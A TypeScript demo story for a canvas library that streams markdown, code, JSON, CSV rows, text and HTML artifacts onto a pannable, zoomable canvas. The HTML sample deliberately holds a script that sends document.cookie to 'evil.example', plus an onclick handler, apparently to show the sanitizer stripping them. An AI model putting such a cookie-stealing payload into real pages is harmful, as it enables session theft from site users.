import {
  codeSegmenter,
  jsonSegmenter,
  markdownSegmenter,
  rowsSegmenter,
  textSegmenter,
  completeJsonPrefix,
} from "@dopejs/canvas-artifact";
import {
  createCamera,
  createSegmentedPort,
  panCamera,
  screenToWorld,
  SceneStore,
  StreamCoalescer,
  StreamingIngestion,
  VisibilityTracker,
  worldToScreen,
  zoomCameraAt,
  type ArtifactHandle,
  type Camera,
  type SegmentedPort,
} from "@dopejs/canvas-core";
import type { ArtifactFrame, ArtifactKind, StreamSegmenter } from "@dopejs/canvas-protocol";
import { htmlSegmenter, sanitizeHtml } from "@dopejs/canvas-security";
import { createHiDpiCanvas } from "./hidpi.js";

export default {
  title: "Canvas Stream",
};

interface KindSpec {
  readonly kind: ArtifactKind;
  readonly segmenter: StreamSegmenter;
  readonly hue: number;
  /** Turn the committed prefix into the text drawn inside the frame. */
  readonly render: (committed: string, complete: boolean) => string;
}

/**
 * Each kind carries its own rule for when received characters stop being
 * provisional, and its own way of turning the committed prefix into something
 * displayable. The canvas drives them all through one ingestion engine.
 */
const KINDS: readonly KindSpec[] = [
  { kind: "markdown", segmenter: markdownSegmenter, hue: 210, render: (text) => text },
  { kind: "code", segmenter: codeSegmenter, hue: 275, render: (text) => text },
  {
    kind: "json",
    segmenter: jsonSegmenter,
    // Closing the open structures keeps partial output parseable, so the frame
    // shows real formatted data instead of a truncated blob.
    render: (text) => (text ? JSON.stringify(JSON.parse(completeJsonPrefix(text)), null, 1) : ""),
    hue: 150,
  },
  { kind: "rows", segmenter: rowsSegmenter, hue: 30, render: (text) => text },
  { kind: "text", segmenter: textSegmenter, hue: 340, render: (text) => text },
  {
    kind: "html",
    segmenter: htmlSegmenter,
    // Rasterizing HTML inside the canvas is the M0 browser work; until that
    // path is proven this frame shows the sanitized markup the tier would draw.
    render: (text) => {
      const result = sanitizeHtml(text);
      return result.ok ? result.html : "";
    },
    hue: 95,
  },
];

const SOURCES: Record<ArtifactKind, string> = {
  markdown:
    "## Q3 summary\n\nRevenue reached **$4.2M**, up 12% quarter over quarter.\n\n" +
    "Drivers:\n- Enterprise renewals\n- Self-serve conversion\n\n" +
    "See the [full breakdown](https://example.com/q3) for segment detail.\n",
  code:
    "export function growth(prev: number, next: number): number {\n" +
    "  if (prev === 0) throw new RangeError('no baseline');\n" +
    "  return (next - prev) / prev;\n" +
    "}\n",
  json:
    '{"quarter":"Q3","rows":[{"segment":"Enterprise","growth":0.18},' +
    '{"segment":"Self-serve","growth":0.07},{"segment":"Partners","growth":0.04}],"total":4200000}',
  rows:
    "segment,revenue,growth\nEnterprise,2400000,18%\nSelf-serve,1100000,7%\n" +
    "Partners,700000,4%\nTotal,4200000,12%\n",
  text:
    "The quarter closed ahead of plan. Enterprise renewals carried most of the " +
    "growth, while self-serve conversion improved after the onboarding change. 📈\n",
  html:
    '<section class="card"><h3>Q3 revenue</h3><p>Up <strong>12%</strong> QoQ.</p>' +
    '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>' +
    '<p onclick="alert(1)">Appendix follows.</p></section>',
};

interface StreamingNode {
  readonly id: string;
  readonly spec: KindSpec;
  readonly frame: ArtifactFrame;
  readonly handle: ArtifactHandle;
  readonly port: SegmentedPort;
  readonly ingestion: StreamingIngestion;
  readonly chunks: readonly string[];
  cursor: number;
  display: string;
  done: boolean;
}

function tokenize(text: string, seed: number): string[] {
  const chunks: string[] = [];
  let index = 0;
  let step = 2 + (seed % 4);
  while (index < text.length) {
    chunks.push(text.slice(index, index + step));
    index += step;
    step = (step % 9) + 2;
  }
  return chunks;
}

/**
 * Artifacts stream onto the canvas itself. The agent announces a new frame
 * every few ticks — the scene grows while its contents are still arriving —
 * and each frame fills in under its own kind's stability rule. Drag to pan,
 * scroll to pan, pinch or ⌘/Ctrl+scroll to zoom while generation continues.
 */
export const Streaming_Nodes = (): HTMLElement => {
  const root = document.createElement("div");
  root.style.cssText = "font: 12px system-ui; position: relative;";

  const { canvas, context, cssWidth, cssHeight, clear } = createHiDpiCanvas(960, 620);
  canvas.style.cssText += "border: 1px solid #ccc; border-radius: 6px; cursor: grab;";

  const controls = document.createElement("div");
  controls.style.cssText = "display: flex; gap: 8px; align-items: center; margin-bottom: 8px;";
  const playButton = document.createElement("button");
  playButton.textContent = "Generate";
  const resetButton = document.createElement("button");
  resetButton.textContent = "Reset";
  const speed = document.createElement("input");
  speed.type = "range";
  speed.min = "16";
  speed.max = "220";
  speed.value = "70";
  speed.style.width = "140px";
  const speedLabel = document.createElement("span");
  speedLabel.style.color = "#555";
  speedLabel.textContent = "70ms / token";
  controls.append(playButton, resetButton, speed, speedLabel);

  const hud = document.createElement("div");
  hud.style.cssText =
    "position: absolute; top: 38px; left: 8px; background: rgba(255,255,255,.92); " +
    "padding: 6px 10px; border-radius: 6px; box-shadow: 0 1px 4px rgba(0,0,0,.2); white-space: pre;";
  root.append(controls, canvas, hud);

  let store: SceneStore;
  let tracker: VisibilityTracker;
  let nodes: StreamingNode[] = [];
  let camera: Camera;
  let clock = 0;
  let announced = 0;
  let timer: number | null = null;

  const announce = (): void => {
    const index = announced;
    const spec = KINDS[index % KINDS.length] as KindSpec;
    const column = index % 3;
    const row = Math.floor(index / 3);
    const frame: ArtifactFrame = {
      x: -420 + column * 300,
      y: -260 + row * 260,
      width: 260,
      height: 210,
      zIndex: index,
    };
    const id = `${spec.kind}-${index}`;
    const handle = store.transact((tx) => tx.createArtifact(id, frame));
    const port = createSegmentedPort({
      segmenter: spec.segmenter,
      render: spec.render,
      maxChars: 4096,
    });
    const ingestion = new StreamingIngestion(
      store,
      handle,
      port,
      new StreamCoalescer({ minIntervalMs: 0, minChars: 1 }),
    );
    nodes.push({
      id,
      spec,
      frame,
      handle,
      port,
      ingestion,
      chunks: tokenize(SOURCES[spec.kind], index),
      cursor: 0,
      display: "",
      done: false,
    });
    announced += 1;
  };

  const tick = (): boolean => {
    clock += 16;
    // The agent keeps announcing frames while earlier ones are still filling.
    if (announced < KINDS.length && clock % 96 === 0) announce();

    let active = false;
    for (const node of nodes) {
      if (node.done) continue;
      if (node.cursor >= node.chunks.length) {
        node.display = node.ingestion.finish().html;
        node.done = true;
        continue;
      }
      const result = node.ingestion.push(node.chunks[node.cursor] as string, clock);
      node.cursor += 1;
      if (result.rendered) node.display = result.html;
      if (result.status === "rejected") node.done = true;
      active = true;
    }
    draw();
    return active || announced < KINDS.length;
  };

  const wrap = (text: string, maxWidth: number, maxLines: number): string[] => {
    const lines: string[] = [];
    for (const paragraph of text.split("\n")) {
      if (lines.length >= maxLines) break;
      if (paragraph === "") {
        lines.push("");
        continue;
      }
      let current = "";
      for (const word of paragraph.split(" ")) {
        const candidate = current === "" ? word : `${current} ${word}`;
        if (context.measureText(candidate).width > maxWidth && current !== "") {
          lines.push(current);
          current = word;
          if (lines.length >= maxLines) break;
        } else {
          current = candidate;
        }
      }
      if (lines.length < maxLines && current !== "") lines.push(current);
    }
    return lines.slice(0, maxLines);
  };

  const draw = (): void => {
    const start = performance.now();
    clear();
    const sets = tracker.compute(store, camera);
    const visible = new Set(sets.visible);

    let streaming = 0;
    for (const node of nodes) {
      const record = store.getById(node.id);
      if (!record) continue;
      if (record.lifecycle === "streaming") streaming += 1;
      if (!visible.has(node.id)) continue;

      const topLeft = worldToScreen(camera, { x: node.frame.x, y: node.frame.y });
      const width = node.frame.width * camera.zoom;
      const height = node.frame.height * camera.zoom;
      const isStreaming = record.lifecycle === "streaming";

      context.fillStyle = "#fff";
      context.strokeStyle = isStreaming
        ? `hsl(${node.spec.hue} 70% 55%)`
        : `hsl(${node.spec.hue} 30% 72%)`;
      context.lineWidth = isStreaming ? 2 : 1;
      if (isStreaming) context.setLineDash([6, 4]);
      context.beginPath();
      context.roundRect(topLeft.x, topLeft.y, width, height, 8 * Math.min(camera.zoom, 1));
      context.fill();
      context.stroke();
      context.setLineDash([]);

      // Kind badge and progress bar.
      context.fillStyle = `hsl(${node.spec.hue} 60% 92%)`;
      context.fillRect(topLeft.x, topLeft.y, width, 22 * camera.zoom);
      context.fillStyle = `hsl(${node.spec.hue} 60% 28%)`;
      context.font = `${11 * Math.min(camera.zoom, 1.2)}px ui-monospace, monospace`;
      context.fillText(node.spec.kind, topLeft.x + 8, topLeft.y + 15 * camera.zoom);

      const received = node.port.buffer.length;
      const total = SOURCES[node.spec.kind].length;
      context.fillStyle = `hsl(${node.spec.hue} 70% 55%)`;
      context.fillRect(topLeft.x, topLeft.y + height - 3, (width * received) / total, 3);

      if (camera.zoom > 0.35) {
        context.fillStyle = "#20242a";
        context.font = `${10.5 * Math.min(camera.zoom, 1.2)}px ui-monospace, monospace`;
        const lineHeight = 13 * Math.min(camera.zoom, 1.2);
        const maxLines = Math.floor((height - 34 * camera.zoom) / lineHeight);
        const lines = wrap(node.display, width - 16, Math.max(0, maxLines));
        lines.forEach((line, index) => {
          context.fillText(
            line,
            topLeft.x + 8,
            topLeft.y + 30 * camera.zoom + index * lineHeight,
            width - 16,
          );
        });

        // The withheld tail, shown as the caret the reader never sees resolve.
        if (isStreaming && node.port.pending !== null) {
          context.fillStyle = `hsl(${node.spec.hue} 80% 45%)`;
          const caretY = topLeft.y + 30 * camera.zoom + Math.max(0, lines.length - 1) * lineHeight;
          const caretX =
            topLeft.x + 8 + context.measureText(lines[lines.length - 1] ?? "").width + 2;
          context.fillRect(caretX, caretY - 9, 5, 11);
        }
      }
    }

    const withheld = nodes.reduce(
      (sum, node) => sum + (node.port.buffer.length - node.port.committedLength),
      0,
    );
    const pendingReasons = [...new Set(nodes.map((node) => node.port.pending).filter(Boolean))];
    hud.textContent =
      `nodes ${nodes.length}   streaming ${streaming}   visible ${sets.visible.length}` +
      `   cold ${sets.cold.length}\n` +
      `withheld ${withheld} chars   reasons ${pendingReasons.join(", ") || "—"}\n` +
      `zoom ${camera.zoom.toFixed(2)}   draw ${(performance.now() - start).toFixed(2)} ms`;
  };

  const stop = (): void => {
    if (timer !== null) {
      clearInterval(timer);
      timer = null;
    }
    playButton.textContent = "Generate";
  };

  const reset = (): void => {
    stop();
    store = new SceneStore();
    tracker = new VisibilityTracker();
    nodes = [];
    announced = 0;
    clock = 0;
    camera = createCamera({
      x: 0,
      y: 0,
      zoom: 0.9,
      viewportWidth: cssWidth,
      viewportHeight: cssHeight,
    });
    announce();
    draw();
  };

  playButton.addEventListener("click", () => {
    if (timer !== null) {
      stop();
      return;
    }
    playButton.textContent = "Pause";
    timer = window.setInterval(() => {
      if (!tick()) stop();
    }, Number(speed.value));
  });
  resetButton.addEventListener("click", reset);
  speed.addEventListener("input", () => {
    speedLabel.textContent = `${speed.value}ms / token`;
    if (timer !== null) {
      stop();
      playButton.click();
    }
  });

  let dragging = false;
  let lastX = 0;
  let lastY = 0;
  canvas.addEventListener("pointerdown", (event) => {
    dragging = true;
    lastX = event.offsetX;
    lastY = event.offsetY;
    canvas.setPointerCapture(event.pointerId);
    canvas.style.cursor = "grabbing";
  });
  canvas.addEventListener("pointermove", (event) => {
    if (!dragging) return;
    camera = panCamera(camera, -(event.offsetX - lastX), -(event.offsetY - lastY));
    lastX = event.offsetX;
    lastY = event.offsetY;
    draw();
  });
  canvas.addEventListener("pointerup", () => {
    dragging = false;
    canvas.style.cursor = "grab";
  });
  canvas.addEventListener(
    "wheel",
    (event) => {
      event.preventDefault();
      if (event.ctrlKey || event.metaKey) {
        const factor = Math.exp(-Math.max(-64, Math.min(64, event.deltaY)) * 0.01);
        camera = zoomCameraAt(camera, { x: event.offsetX, y: event.offsetY }, factor);
      } else {
        camera = panCamera(camera, event.deltaX, event.deltaY);
      }
      draw();
    },
    { passive: false },
  );
  canvas.addEventListener("dblclick", (event) => {
    // Double click reports which artifact sits under the cursor, proving the
    // spatial index tracks frames that are still being generated.
    const world = screenToWorld(camera, { x: event.offsetX, y: event.offsetY });
    const hit = store.queryPoint(world.x, world.y)[0];
    if (hit) hud.textContent = `${hud.textContent}\nhit ${hit}`;
  });

  reset();
  return root;
};
